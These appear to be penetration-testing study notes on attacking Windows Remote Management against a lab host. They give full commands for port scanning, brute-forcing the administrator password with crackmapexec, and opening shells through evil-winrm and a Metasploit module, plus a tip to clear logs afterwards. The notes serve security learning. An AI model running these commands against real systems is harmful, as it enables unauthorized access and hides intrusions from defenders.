- WinRM (Windows Remote Management) is not configured to be run by default, and needs to be explicitly enabled and configured in order for it to work.
- Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).
- Microsoft implemented WinRM in Windows in order to make life easier for System Administrators.
- WinRM is typically used in the following ways:
	- Remotely access and interact with Windows hosts on a local network.
	- Remotely access and execute commands on Windows systems.
	- Manage and configure Windows systems remotely.
- WinRM typically uses TCP port 5985 and 5986 (in case of data transmission being done over HTTPS, instead of HTTP).

WinRM Exploitation
- WinRM implements access control and security for communication between systems through various forms of authentication.
- Authentication is generally performed through a system's user account credentials, alternatively a password hash can also be provided to authenticate oneself and gain access to WinRM.
- We can utilize a utility called `crackmapexec` to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system.
- We can also utilize a ruby script called `evil-winrm` to obtain a command shell session on the target system.

Practical Demonstration
- `nmap -sV 10.2.18.45 -T4`
- The default Nmap scan is unable to detect WinRM, since the ports that WinRM runs on by default fall out of the port range of a default Nmap scan, with no port range specified during command execution.
- `nmap -sV 10.2.18.45 -p 5985,5986`
- Windows doesn't have an explicit service banner for WinRM, so it is generally recommended to ignore the service version being displayed in a Nmap version detection scan, for the WinRM service.
- Exploitation using `crackmapexec` (Provides command execution on the target system)
	- `crackmapexec`
	- `crackmapexec` can not only be used to attack WinRM, but also MSSQL, SMB and SSH.
	- `crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
	- We are only targeting the administrator account in this attack because:
		- The administrator account is created during Windows installation by default, and as such is present on almost all Windows installations.
		- The administrator account is typically the user account used by System Administrators to use WinRM.
		- If we gain access to the administrator account, we will have elevated privileges by default upon exploitation, and as such would not have to perform the process of privilege escalation.
	- When `crackmapexec` is run to perform the brute-force attack we can observe that it provides an informational message about the tool connection to a service known as `wsman`, this is because WinRM itself is an implementation of the Windows Management API, also known as `wsman`.
	- `crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami"`
	- `crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "systeminfo"`
	- Since we are not utilizing any malicious payloads in the exploitation process, and are relying on brute-force attacks to find legitimate credentials to logon with, this attack can be considered relatively stealthy, once we get access to the system, we can utilize our access to clear the logs of our activity during the exploitation phase.
	- Since WinRM is explicitly enabled on the system, a firewall rule or exception would have been added so that one can communicate with the system via WinRM without restrictions.
- Exploitation using Evil-WinRM (Provides a PowerShell session on the target system)
	- `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.18.45`
	- `whoami`
	- `ipconfig`
	- `net user`
- Exploitation using the Metasploit Framework (Provides a Meterpreter session on the target system)
	- `service postgresql start && msfconsole`
	- `search winrm_script_exec`
	- `use exploit/windows/winrm/winrm_script_exec`
	- `options`
	- `set RHOSTS 10.2.18.45`
	- `set RPORT 5985`
	- `set USERNAME administrator`
	- `set PASSWORD tinkerbell`
	- `set FORCE_VBS true`
	- `exploit`
	- In case this particular exploit doesn't work, we might have to keep retrying it.
	- In case the Meterpreter session is unstable or lacks appropriate privilege, the exploit module will attempt to migrate to specified system level processes to stabilize the shell and elevate privileges.
	- Meterpreter Session
		- `sysinfo`